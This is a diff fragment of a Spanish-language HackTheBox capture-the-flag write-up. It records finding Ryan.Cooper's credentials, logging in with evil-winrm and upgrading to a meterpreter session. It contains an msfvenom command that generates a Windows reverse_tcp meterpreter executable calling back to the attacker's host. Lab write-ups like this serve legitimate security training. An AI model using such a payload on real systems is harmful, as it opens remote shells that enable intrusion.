@@ -66,4 +66,13 @@ Aquí encontramos las credenciales de Ryan.Cooper
 
 ![HTB](https://user-images.githubusercontent.com/108554878/225093457-d8d46db7-36ee-45a0-8b0d-e3299bb386db.png)
 
+Con esto encontramos el user entrando desde evil-winrm
+
+![HTB](https://user-images.githubusercontent.com/108554878/225094140-60254216-ca82-495b-aa7d-885bcf8614ad.png)
+
+Cambio la sesión a meterpreter 
+
+~~~
+msfvenom -p windows/meterpreter/reverse_tcp LHOST={IP de mi máquina} LPORT=1232 -f exe > xddd.exe 
+~~~
 
